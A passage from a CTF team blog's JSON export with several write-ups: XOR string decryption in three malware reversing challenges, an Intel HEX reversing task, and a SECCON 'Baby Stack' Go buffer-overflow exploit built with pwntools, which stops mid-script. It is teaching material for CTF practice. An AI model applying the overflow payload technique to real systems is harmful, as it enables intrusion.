||||||| 0x7f3e3151b0f2 3c52 cmp al, 0x52 ; &apos;R&apos; ; 82 ========&lt; 0x7f3e3151b0f4 0f85ed010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b0fa e9ca010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b0ff 56 push rsi ||||||| 0x7f3e3151b100 52 push rdx ||||||| 0x7f3e3151b101 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b103 3c50 cmp al, 0x50 ; &apos;P&apos; ; 80 ========&lt; 0x7f3e3151b105 0f85dc010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b10b e9b9010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b110 56 push rsi ||||||| 0x7f3e3151b111 52 push rdx ||||||| 0x7f3e3151b112 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b114 3c68 cmp al, 0x68 ; &apos;h&apos; ; 104 ========&lt; 0x7f3e3151b116 0f85cb010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b11c e9a8010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b121 56 push rsi ||||||| 0x7f3e3151b122 52 push rdx ||||||| 0x7f3e3151b123 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b125 3c31 cmp al, 0x31 ; &apos;1&apos; ; 49 ========&lt; 0x7f3e3151b127 0f85ba010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b12d e997010000 jmp 0x7f3e3151b2c9 ||||||| ;-- rax: ||||||| 0x7f3e3151b132 56 push rsi ||||||| 0x7f3e3151b133 52 push rdx ||||||| 0x7f3e3151b134 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b136 3c6e cmp al, 0x6e ; &apos;n&apos; ; 110 ========&lt; 0x7f3e3151b138 0f85a9010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b13e e986010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b143 56 push rsi ||||||| 0x7f3e3151b144 52 push rdx ||||||| 0x7f3e3151b145 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b147 3c47 cmp al, 0x47 ; &apos;G&apos; ; 71 ========&lt; 0x7f3e3151b149 0f8598010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b14f e975010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b154 56 push rsi ||||||| 0x7f3e3151b155 52 push rdx ||||||| 0x7f3e3151b156 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b158 3c5f cmp al, 0x5f ; &apos;_&apos; ; 95 ========&lt; 0x7f3e3151b15a 0f8587010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b160 e964010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b165 56 push rsi ||||||| 0x7f3e3151b166 52 push rdx ||||||| 0x7f3e3151b167 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b169 3c67 cmp al, 0x67 ; &apos;g&apos; ; 103 ========&lt; 0x7f3e3151b16b 0f8576010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b171 e953010000 jmp 0x7f3e3151b2c9 ||||||| 0x7f3e3151b176 56 push rsi ||||||| 0x7f3e3151b177 52 push rdx ||||||| 0x7f3e3151b178 8a07 mov al, byte [rdi] ||||||| 0x7f3e3151b17a 3c30 cmp al, 0x30 ; &apos;0&apos; ; 48 ========&lt; 0x7f3e3151b17c 0f8565010000 jne 0x7f3e3151b2e7 ========&lt; 0x7f3e3151b182 e942010000 jmp 0x7f3e3151b2c9 As you can you can see you can already check the flag and all comparisons that were being made, in my python script I was saving the addresses where each mini shellcode starts, so I could sort the byte order to get the right flag in the end: 12$ python morph.py34C3_M1GHTY_M0RPh1nG_g0","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"shellcode","slug":"shellcode","permalink":"https://teamrocketist.github.io/tags/shellcode/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"radare2","slug":"radare2","permalink":"https://teamrocketist.github.io/tags/radare2/"},{"name":"radare2_script","slug":"radare2-script","permalink":"https://teamrocketist.github.io/tags/radare2-script/"},{"name":"mmap","slug":"mmap","permalink":"https://teamrocketist.github.io/tags/mmap/"},{"name":"34C3ctf2017","slug":"34C3ctf2017","permalink":"https://teamrocketist.github.io/tags/34C3ctf2017/"}]},{"title":"[Reverse] 3DS - IRC Bot Takeover","slug":"Reverse-3DS-IRC-Bot-Takeover","date":"2017-12-19T22:09:52.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/12/19/Reverse-3DS-IRC-Bot-Takeover/","link":"","permalink":"https://teamrocketist.github.io/2017/12/19/Reverse-3DS-IRC-Bot-Takeover/","excerpt":"","text":"IRC Bot Takeover - 486 PointsWARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!!Update: We had some problems with a specific step of the challenge (still possible to solve, but more hard) and we updated the binary. The new file has the old version, but you only need the new to solve. This malware was about controlling a bot net via IRC, we were allowed to access it since the url and port were bot present in the binary, but we didn’t really needed to access it to solve this, unless you infected a machine of yours to debug it to understand better how the malware works(some people actually did this I saw some bots from other players in a channel in IRC we actually could control them lol). This challenge as in Ransomware and w32.killah is once again to decrypt obfuscated strings, but this time they are encrypting the string two times: There were two executables, one of them was useless the one that has the encrypted flag was bot.exe. The code above is present at the sub-routine sub_4012E1 if you use IDA open the binary (bot.exe executable). Once again the xor_encryption2 is exactly like w32.killah, I had to brute force the key once again, but this time since they are encrypting twice I need to brute force two keys instead of one: 12345678910111213141516171819202122232425262728import structimport stringdef xor_encrytion(al, ecx, edx): c = '' for i in range(ecx): n = chr((((ord(edx[i]) + ord(al))%256) ^ ord(al)) %256) s = chr(ord(edx[i]) ^ ord(al)) #print n,s if s in string.printable: c += s else: c += n #print c return cfor j in range(1,0xff): for i in range(1,0xff): e = xor_encrytion(al=chr(i), ecx=0x10-1, edx='%&lt;EmqhiYUi0deY\\\\') h = xor_encrytion(al=chr(j), ecx=0x10-1, edx=e) print h, i, jfor j in range(1,0xff): for i in range(1,0xff): e = xor_encrytion(al=chr(i), ecx=0x12-1, edx='mckW,sSWisWdak3!u') h = xor_encrytion(al=chr(j), ecx=0x12-1, edx=e) print h, i, j The first part of the flag:12345678$ python ircbot.py | grep '3DS&#123;'3DS&#123;wpwgcw8lsgd 139 83DS&#123;who_#o0ls_d 229 983DS&#123;who_#o0ls_d 228 993DS&#123;who_#o0ls_d 230 993DS&#123;who_co0ls_d 133 1303DS&#123;who_co0ls_d 132 1313DS&#123;who_co0ls_d 134 131 The rest: 1234567891011121314$ python ircbot.py | grep '&#125;\\s'......uck_4sS_is_lak3!&#125; 224 100uow[4^?_[i^?[law?!&#125; 226 100Ec&#123;_^DsS_ys_la&#123;3!&#125; 232 100EoGk^D^?_ky^?klaG?!&#125; 234 100komQ*^?UQo^?Qlam5'&#125; 96 102ukoS(&#123;WSm&#123;Slao7%&#125; 98 102EmGY\"^?]Yy^?YjoG=/&#125; 104 102EoC[ &#123;_[y&#123;[lmC?-&#125; 106 102uow[4^?_[i^?[law?!&#125; 224 102...... A simple script to join the parts of the flag since we now know the keys: 1234567891011121314151617181920212223242526272829303132333435import structimport stringdef xor_encrytion(al, ecx, edx): c = '' for i in range(ecx): n = chr((((ord(edx[i]) + ord(al))%256) ^ ord(al)) %256) s = chr(ord(edx[i]) ^ ord(al)) #print n,s if s in string.printable: c += s else: c += n #print c return cdef sub_4005D0(al, ecx, edx): c = '' for i in range(ecx): c += chr(ord(edx[i]) ^ ord(al)) return ca = sub_4005D0(al='\\x12',ecx=7-1, edx='1`scg&#123;')b = sub_4005D0(al='\\x12',ecx=0x11-1, edx='&#123;`q&lt;t`ww|&#125;vw&lt;|wf')c = sub_4005D0(al='\\x12',ecx=0xa-1, edx='s``&#125;\\x7f\\x70\\x73\\x76\\x7d')d = sub_4005D0(al='\\x12',ecx=0x8-1, edx='qsfgsps')f = xor_encrytion(al='\\x85', ecx=0x10-1, edx='%&lt;EmqhiYUi0deY\\\\')g = xor_encrytion(al='\\x82', ecx=0x10-1, edx=f)h = xor_encrytion(al='\\xe4', ecx=0x12-1, edx='mckW,sSWisWdak3!u')i = xor_encrytion(al='\\xc0', ecx=0x12-1, edx=h)print a,b,c,dprint g+i Running it 123$ python ircbot.py#raqui irc.freenode.net arrombado catuaba3DS&#123;who_co0ls_duck_4sS_is_lak3!&#125; The flag was 3DS{who_co0ls_duck_4sS_is_lak3!}, note that the first line is other obfuscated strings you could decrypt to help you understand the control flow of the binary.","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"xor","slug":"xor","permalink":"https://teamrocketist.github.io/tags/xor/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"malware","slug":"malware","permalink":"https://teamrocketist.github.io/tags/malware/"},{"name":"3DS2017","slug":"3DS2017","permalink":"https://teamrocketist.github.io/tags/3DS2017/"}]},{"title":"[Reverse] 3DS - W32.killah","slug":"Reverse-3DS-W32-killah","date":"2017-12-19T21:15:19.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/12/19/Reverse-3DS-W32-killah/","link":"","permalink":"https://teamrocketist.github.io/2017/12/19/Reverse-3DS-W32-killah/","excerpt":"","text":"W32.killah - 487 PointsCaution.. “The flag is over there..”Password: “infected!”WARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!! Another malware problem, all malware problems were practically the same the writer of this challenge should have at least make it different from the others, as in Ransomware we have to decrypt more obfuscated strings but this time the encryption function is more difficult to understand, it does a summation before a xor, and uses 8 bit based operations (8 bit registers), we can see the beginning of start function we are actually decrypting a string: As I explained previously in Ransomware ecx is storing the string length, al is the single byte used to encrypt the string and edx is where is stored the encrypted string. Analysing the encryption function sub_4011A9, we can see it doesn’t only uses xor but it uses an addition operation before that: We know that a character must be between 0 to 255, the additions will break this range, I’m not so sure about this but I think in assembly when there is an 8 bit operation if an overflow occurs, it returns back to 0 and that’s what I tried to write in python : 1234567891011121314151617import structdef xor_encrytion(al, ecx, edx): c = '' for i in range(ecx): n = chr((((ord(edx[i]) + ord(al))%256) ^ ord(al)) %256) s = chr(ord(edx[i]) ^ ord(al)) #print n,s if s in string.printable: c += s else: c += n #print c return cbuf = struct.pack (\"17B\", *[0xC6,0xb4,0xc6,0xca,0xf2,0xe3,0xe9,0xf3,0xf9,0xfb,0xf6,0xde,0xe8,0xf3,0xec,0xff,0xaa]) Well this actually worked for the first encrypted string: 12$ python w32killah.py3DS&#123;m4lw@r3_1 And we got the first part of the flag… while searching in IDA I didn’t initially found the other encryption code until I started searching and found some code that wasn’t present in the function window: Once again we need to decrypt that string but this time the function I wrote in python didn’t really work, outputed me a bunch of non printable characters, so I may misunderstood how actually 8 bit operations work in assembly, but I still managed to solve this by trying a bunch of other key bytes: 1234567891011121314151617181920import structimport stringdef xor_encrytion(al, ecx, edx): c = '' for i in range(ecx): n = chr((((ord(edx[i]) + ord(al))%256) ^ ord(al)) %256) s = chr(ord(edx[i]) ^ ord(al)) #print n,s if s in string.printable: c += s else: c += n #print c return cfor i in range(1,0xff): print xor_encrytion(al=chr(i),ecx=0x10-1,edx=struct.pack (\"15B\", *[ 0xb3,0xdf,0xa6,0xb5,0xa3,0xcb,0xa9,0xae,0xc7,0xdf,0xa6, 0xb5,0xae,0xe1,0xbd])), i A there we go the key to decrypt the flag with the function I wrote was 96 in hex is 0x60:12345678910111213141516171819202122$ python w32.killah.py | grep '&#125;'s_fucKinG_fun!&#125; 96w#jugOirK#jur!&#125; 98s'n&#125;cKivO'n&#125;v!E 100&#125;!nmUkvI!nv#G 101#j&#125;oWirK#j&#125;r!E 102&#125;!j&#123;mUwrI!j&#123;r/C 103M!~O&#125;U&#123;vY!~Ov#G 109M!zK&#125;UwrY!zKr?C 111/C:)?W52[C:)2&#125;! 156s_fuc inG_fun!&#125; 192&#123;on&#125;k[afGon&#125;f)u 200&#125;ch&#123;mWg` ch&#123;`/s 206` ufpMz&#125;I uf&#125;2n 211g rawK&#125;zO raz5i 212ha&#125;nx&#125;ruya&#125;nu:f 219mcxk&#125;wwp&#123;cxkp?c 222 The flag was 3DS{m4lw@r3_1s_fucKinG_fun!}","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"xor","slug":"xor","permalink":"https://teamrocketist.github.io/tags/xor/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"malware","slug":"malware","permalink":"https://teamrocketist.github.io/tags/malware/"},{"name":"3DS2017","slug":"3DS2017","permalink":"https://teamrocketist.github.io/tags/3DS2017/"}]},{"title":"[Reverse] 3DS - Ransomware","slug":"Reverse-3DS-Ransomware","date":"2017-12-18T19:45:33.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/12/18/Reverse-3DS-Ransomware/","link":"","permalink":"https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Ransomware/","excerpt":"","text":"Ransomware - 464 PointsWARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!! We have a malware to analyse, right at the beginning(_start function) I found an encrypted string with xor, reversing it wasn’t very hard as you can see bellow: The actual function in the ida was this one: Rewriting this function into python we ended up with this: 123456789101112import structdef sub_4005D0(al, ecx, edx): c = '' for i in range(ecx): c += chr(ord(edx[i]) ^ ord(al)) return cfirst = struct.pack (\"16B\", *[0xea,0xe8,0xe4,0xe8,0xef,0xdb,0xe1,0xeb,0xe6,0xe0,0xa9,0xea,0xe8,0xe4,0xe8,0xef])print sub_4005D0(al='\\x87',ecx=0x11-1, edx=first) By running the script we can see that the encrypted string was the name of the file we received from the challenge which was encrypted: 12$ python writeup_mocoh.py mocoh\\flag.moco One good thing to do while reversing is to rename the function and string names to a more readable names, so if they are reused we can immediately recognize them : Now continuing analysing the contents of sub_40023B we have more strings to decrypt: Updating this python script with this: 123456789101112131415161718192021222324import structdef sub_4005D0(al, ecx, edx): c = '' for i in range(ecx): c += chr(ord(edx[i]) ^ ord(al)) return cfirst = struct.pack (\"16B\", *[0xea,0xe8,0xe4,0xe8,0xef,0xdb,0xe1,0xeb,0xe6,0xe0,0xa9,0xea,0xe8,0xe4,0xe8,0xef])print sub_4005D0(al='\\x87',ecx=0x11-1, edx=first)a = sub_4005D0(al='\\x54',ecx=9-1, edx=struct.pack (\"8B\", *[0x27,0x31,0x21,0x26,0x21,0x36,0x21,0x37]))b = sub_4005D0(al='\\x80',ecx=9-1, edx=struct.pack (\"8B\", *[0xe1,0xee,0xf4,0xe1,0xf3,0xf3,0xe5,0xe5]))c = sub_4005D0(al='\\x14',ecx=9-1, edx=struct.pack (\"8B\", *[0x61,0x77,0x7b,0x78,0x7b,0x77,0x75,0x62]))d = sub_4005D0(al='\\x32',ecx=0xa-1, edx=struct.pack (\"9B\", *[0x53,0x5c,0x53,0x55,0x53,0x5b,0x5d,0x5e,0x53]))print aprint bprint cprint d By running we can see it’s some words in Portuguese and they don’t look really useful at all: 1234567$ python mocoh.pymocoh\\flag.mocohmocoh\\flag.mocohseurubucantasseeucolocavanagaiola After renaming the variable names in IDA ended up in this final part of the program: As you can see above every string we decrypted is being concatenated into a place in memory at dword_4012c0, and at the end in sub_4005DA the flag file name is being pushed in to the stack since this will be a argument to that function so this may be the one that was used to encrypted the flag.mocoh file! Now by checking this function I found it too hard to reverse sub_400684, without running the malware itself (Couldn’t do it since it executable wasn’t compatible with my Windows 10 VM), so after failing to infect myself and debugging it with IDA, I checked that sub_4006D8 of them was using xor again to encrypt that file: Now you may be asking if I didn’t reverse sub_400684 how the hell I did get the keys to decrypt the flag file? well I wasn’t really expecting this to happen but at some point I knew I could know the first 4 bytes of the key because we know the first 4 bytes of the plaintext which is part of the flag format 3DS{, I wanted to check before reversing the rest, the first 4 bytes of the key, I did this by brute-forcing byte by byte: 1234567flag_cipher = open('flag.mocoh', 'r').read()plain = '3DS&#123;'for i in range(0x4): for x in xrange(1,0xff): if ord(plain[i]) == ord(flag_cipher[i]) ^ x: print x break And surprisingly to me the first 4 bytes of the keys was always 175 12345$ python test.py 175175175175 And then I asked myself what if the key is always the same? this couldn’t be a coincidence: 12345flag_cipher = open('flag.mocoh', 'r').read()flag = ''for i,c in enumerate(flag_cipher): flag += chr(ord(c) ^ 175)print flag Running it we could see that this was the case…12$ python test.py 3DS&#123;4sS3mbly_r0cks!!&#125; And in the end I realized that I lost a lot of time reversing the binary, we didn’t even needed to reverse anything, if we made a guess that it was xor we could just tried and check that it was using always the same 1 byte key to encrypt…","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"xor","slug":"xor","permalink":"https://teamrocketist.github.io/tags/xor/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"malware","slug":"malware","permalink":"https://teamrocketist.github.io/tags/malware/"},{"name":"3DS2017","slug":"3DS2017","permalink":"https://teamrocketist.github.io/tags/3DS2017/"},{"name":"ida","slug":"ida","permalink":"https://teamrocketist.github.io/tags/ida/"}]},{"title":"[Reverse] 3DS - Scared Flag","slug":"Reverse-3DS-Scared-Flag","date":"2017-12-18T03:58:03.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/12/18/Reverse-3DS-Scared-Flag/","link":"","permalink":"https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Scared-Flag/","excerpt":"","text":"Scared Flag - 479 Pointsヽ(ﾟДﾟ)ﾉ After unzipping the file we can see that we have a .hex which according to Wikipedia: Intel HEX is a file format that conveys binary information in ASCII text form. It is commonly used for programming microcontrollers, EPROMs, and other types of programmable logic devices. In a typical application, a compiler or assembler converts a program’s source code (such as in C or assembly language) to machine code and outputs it into a HEX file. So after finding out what the hell was this I searched in the web a way to convert this into a binary format or assembly, and I found a post in stack overflow recommending to use this… After downloading, I made the conversion: 12345678910111213$ ./hex2bin -b ../ea137e7356e566945e51bbece00a22ad.hex hex2bin v2.5, Copyright (C) 2017 Jacques Pelletier &amp; contributorsAllocate_Memory_and_Rewind:Lowest address: 00000000Highest address: 00000BC5Starting address: 00000000Max Length: 3014Binary file start = 00000000Records start = 00000000Highest address = 00000BC5Pad Byte = FF The program outputs a ea137e7356e566945e51bbece00a22ad.bin, I used radare2 to reverse it, after checking the code I saw the initials of the flag in this routine at fcn.000005de (You need to scroll down a little in radare2 the function is quite big).The flag was 3DS{youareabully}","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"3DS2017","slug":"3DS2017","permalink":"https://teamrocketist.github.io/tags/3DS2017/"},{"name":"radare2","slug":"radare2","permalink":"https://teamrocketist.github.io/tags/radare2/"},{"name":"intel_hex","slug":"intel-hex","permalink":"https://teamrocketist.github.io/tags/intel-hex/"},{"name":"hex2bin","slug":"hex2bin","permalink":"https://teamrocketist.github.io/tags/hex2bin/"}]},{"title":"[Pwn] SECCON - Baby Stack","slug":"Pwn-SECCON-Baby-Stack","date":"2017-12-13T04:05:45.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/12/13/Pwn-SECCON-Baby-Stack/","link":"","permalink":"https://teamrocketist.github.io/2017/12/13/Pwn-SECCON-Baby-Stack/","excerpt":"","text":"Baby StackCan you do a traditional stack attack?Host : baby_stack.pwn.seccon.jpPort : 15285baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 Overflow the BufferWe have a go executable which is harder to reverse than c, by reading the challenge title we can see that this challenge is probably about a buffer overflow in the stack, another thing we also notice that the binary is statically linked: 12$ file baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, with debug_info, not stripped Since is statically linked we know that this binary isn’t going to use the libc file in our system, every libc function used is embedded in the binary itself, this a problem we can’t just jump into libc because some useful functions like system aren’t present, but we can still build a ROP chain that does a system call to execve, this is very similar to writting shellcode but instead of writting a script we are going to use gadgets to build it. By checking the security of the binary we can see the only protection enabled is NX (Non-Executable Stack). 123456checksecCANARY : disabledFORTIFY : disabledNX : ENABLEDPIE : disabledRELRO : disabled We don’t have a stack canary to stop us so the first thing to do is to run the binary: 12345678910111213141516171819202122232425262728293031323334$ ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 Please tell me your name &gt;&gt; AGive me your message &gt;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaunexpected fault address 0x0fatal error: fault[signal 0xb code=0x80 addr=0x0 pc=0x456551]goroutine 1 [running]:runtime.throw(0x507550, 0x5) /usr/lib/go-1.6/src/runtime/panic.go:547 +0x90 fp=0xc82003f5b8 sp=0xc82003f5a0runtime.sigpanic() /usr/lib/go-1.6/src/runtime/sigpanic_unix.go:27 +0x2ab fp=0xc82003f608 sp=0xc82003f5b8runtime.memmove(0xc82008a00b, 0x4141414141414141, 0x61414141) /usr/lib/go-1.6/src/runtime/memmove_amd64.s:83 +0x91 fp=0xc82003f610 sp=0xc82003f608fmt.(*fmt).padString(0xc82006ebb8, 0x4141414141414141, 0x61414141) /usr/lib/go-1.6/src/fmt/format.go:130 +0x456 fp=0xc82003f730 sp=0xc82003f610fmt.(*fmt).fmt_s(0xc82006ebb8, 0x4141414141414141, 0x61414141) /usr/lib/go-1.6/src/fmt/format.go:322 +0x61 fp=0xc82003f760 sp=0xc82003f730fmt.(*pp).fmtString(0xc82006eb60, 0x4141414141414141, 0x61414141, 0xc800000073) /usr/lib/go-1.6/src/fmt/print.go:521 +0xdc fp=0xc82003f790 sp=0xc82003f760fmt.(*pp).printArg(0xc82006eb60, 0x4c1c00, 0xc82000a380, 0x73, 0x0, 0x0) /usr/lib/go-1.6/src/fmt/print.go:797 +0xd95 fp=0xc82003f918 sp=0xc82003f790fmt.(*pp).doPrintf(0xc82006eb60, 0x5220a0, 0x18, 0xc82003fea8, 0x2, 0x2) /usr/lib/go-1.6/src/fmt/print.go:1238 +0x1dcd fp=0xc82003fca0 sp=0xc82003f918fmt.Fprintf(0x7fcd857d21e8, 0xc82002c010, 0x5220a0, 0x18, 0xc82003fea8, 0x2, 0x2, 0x40beee, 0x0, 0x0) /usr/lib/go-1.6/src/fmt/print.go:188 +0x74 fp=0xc82003fce8 sp=0xc82003fca0fmt.Printf(0x5220a0, 0x18, 0xc82003fea8, 0x2, 0x2, 0x20, 0x0, 0x0) /usr/lib/go-1.6/src/fmt/print.go:197 +0x94 fp=0xc82003fd50 sp=0xc82003fce8main.main() /home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go:23 +0x45e fp=0xc82003ff50 sp=0xc82003fd50runtime.main() /usr/lib/go-1.6/src/runtime/proc.go:188 +0x2b0 fp=0xc82003ffa0 sp=0xc82003ff50runtime.goexit() /usr/lib/go-1.6/src/runtime/asm_amd64.s:1998 +0x1 fp=0xc82003ffa8 sp=0xc82003ffa0 We did overflow the buffer but what really happened here? If you look at the stack traces we aren’t really getting a segmentation fault because we are replacing the ret address, the exception is occurring because we are changing the parameters of fmt.Printf, the binary isn’t reaching the ret instruction because of this, we need to set some break points before this prints to put the correct addresses on them, something that doesn’t crash the program. To check good breakpoint addresses I used IDA, radare2 was way too slow and didn’t gave me nice results on it, after opening it in IDA I searched for a function named main_main and tryed to find a function bufio___Scanner__Scan which in go is a function that reads inputs from the STDIN.Checking it on another view to check its addresses: After setting some breakpoints in the printf’s after those 2 scans, I realised that the padding needed to reach the 1st parameter was 104 so we can start testing it in the binary: 12345678$ python -c \"print 'A'*104 + 'BBBBBBBB'\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB$ ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 Please tell me your name &gt;&gt; AGive me your message &gt;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB...runtime.memmove(0xc82000e30b, 0x4242424242424242, 0x1)... There it is, we are replacing the address of the string that printf wants to print, we can’t continue overflowing the rest to reach the ret instruction, to get this valid address I just picked a value that I got from gdb from the stack: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849gdb-peda$ b *0x4011D2Note: breakpoint 1 also set at pc 0x4011d2.Breakpoint 2 at 0x4011d2: file /home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go, line 18.gdb-peda$ rStarting program: /baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 [New LWP 8293][New LWP 8294][New LWP 8295]Please tell me your name &gt;&gt; A[----------------------------------registers-----------------------------------]RAX: 0x1 RBX: 0x0 RCX: 0xc82000a2c1 --&gt; 0x41 (&apos;A&apos;)RDX: 0xc820074000 --&gt; 0xa41 (&apos;A\\n&apos;)RSI: 0xc820074000 --&gt; 0xa41 (&apos;A\\n&apos;)RDI: 0xc82000a2c1 --&gt; 0x41 (&apos;A&apos;)RBP: 0x0 RSP: 0xc82003fd50 --&gt; 0x521e40 (&quot;Give me your message &gt;&gt; &quot;)RIP: 0x4011d2 (&lt;main.main+466&gt;: call 0x45ac40 &lt;fmt.Printf&gt;)R8 : 0x1 R9 : 0x1000 R10: 0xc820074000 --&gt; 0xa41 (&apos;A\\n&apos;)R11: 0x202 R12: 0x15 R13: 0x536a54 --&gt; 0x201fe001001e4 R14: 0x1 R15: 0x8EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x4011c3 &lt;main.main+451&gt;: mov QWORD PTR [rsp+0x10],rbx 0x4011c8 &lt;main.main+456&gt;: mov QWORD PTR [rsp+0x18],rbx 0x4011cd &lt;main.main+461&gt;: mov QWORD PTR [rsp+0x20],rbx=&gt; 0x4011d2 &lt;main.main+466&gt;: call 0x45ac40 &lt;fmt.Printf&gt; 0x4011d7 &lt;main.main+471&gt;: mov rbx,QWORD PTR [rsp+0x80] 0x4011df &lt;main.main+479&gt;: mov QWORD PTR [rsp],rbx 0x4011e3 &lt;main.main+483&gt;: call 0x46cbc0 &lt;bufio.(*Scanner).Scan&gt; 0x4011e8 &lt;main.main+488&gt;: mov rax,QWORD PTR [rsp+0x80]No argument[------------------------------------stack-------------------------------------]0000| 0xc82003fd50 --&gt; 0x521e40 (&quot;Give me your message &gt;&gt; &quot;)0008| 0xc82003fd58 --&gt; 0x18 0016| 0xc82003fd60 --&gt; 0x0 0024| 0xc82003fd68 --&gt; 0x0 0032| 0xc82003fd70 --&gt; 0x0 0040| 0xc82003fd78 --&gt; 0x1 0048| 0xc82003fd80 --&gt; 0x0 0056| 0xc82003fd88 --&gt; 0x0 [------------------------------------------------------------------------------] For example an address from the stack can be something like 0xc82003fd58 with this we can start writing the exploit: 12345678from pwn import *padding = 'A' * 104 + p64(0xc82003fd58) + 'AAAAAAAA'process('./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8')r.recvuntil('Please tell me your name &gt;&gt; ')r.sendline('A')r.recvuntil('Give me your message &gt;&gt; ')r.sendline(padding)r.interactive() By running it we can see we are still replacing another parameter from printf: 123456789python writeup.py [+] Starting local process './baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8': pid 8433[*] Switching to interactive modepanic: runtime error: growslice: cap out of rangegoroutine 1 [running]:panic(0x4e4800, 0xc820070280) /usr/lib/go-1.6/src/runtime/panic.go:481 +0x3e6fmt.(*fmt).padString(0xc820076ef8, 0xc82003fd58, 0x4141414141414141) In this case we are replacing the number of characters that are going to be printed by printf! for example if we set the next 8 bytes to be 0x0000000000000002, printf will print 2 characters starting by the address we gave before in the previous 8 bytes (0xc82003fd58). So lets readjust our script to do this:12345678from pwn import *padding = 'A' * 104 + p64(0xc82003fd58) + p64(0x3)process('./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8')r.recvuntil('Please tell me your name &gt;&gt; ')r.sendline('A')r.recvuntil('Give me your message &gt;&gt; ')r.sendline(padding)r.interactive() 12345$ python writeup.py... Thank you, \\x18\\x00\\x00!msg : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[*] Got EOF while reading in interactive As you can see we are no longer seg faulting and as I said before you can see that only 3 bytes are being printed after the string “Thank you, “ we need to calculate the offset to the next printf and do the same thing, give an address and the number of bytes to be printed, only then we can replace the return address with success! So after calculating everything our script will look like this: 1234567891011121314from pwn import *off_printf1 = 104off_printf2 = 80off_retaddress = 192padding_printf1 = 'A' * off_printf1 + p64(0xc82003fd58) + p64(0x3)padding_printf2 = 'A' * off_printf2 + p64(0xc82003fd58) + p64(0x3)padding_retaddresss = 'A'*off_retaddress + p64(0xdeadbeef)padding = padding_printf1 + padding_printf2 + padding_retaddresssr = 